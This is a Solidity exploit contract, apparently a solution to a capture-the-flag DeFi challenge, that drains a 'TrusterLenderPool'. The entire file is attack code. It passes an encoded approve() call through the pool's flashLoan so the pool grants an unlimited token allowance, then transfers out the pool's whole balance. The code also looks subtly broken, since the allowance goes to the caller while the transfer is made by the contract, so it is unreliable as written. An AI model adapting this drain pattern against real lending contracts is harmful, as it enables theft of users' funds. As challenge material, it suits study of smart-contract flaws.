// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './TrusterLenderPool.sol';
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract DrainFunds {
  using SafeERC20 for IERC20;
  using Address for address;

  address private immutable token;
  address private immutable pool;

  constructor(address _pool, address _token) {
    token = _token;
    pool = _pool;
  }

  function drain() external {
    TrusterLenderPool poolContract = TrusterLenderPool(pool);
    IERC20 tokenContract = IERC20(token);
    uint256 balance = tokenContract.balanceOf(pool);
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", msg.sender, type(uint256).max);
    poolContract.flashLoan(0, msg.sender, token, data);
    tokenContract.safeTransferFrom(pool, msg.sender, balance);
  }
}
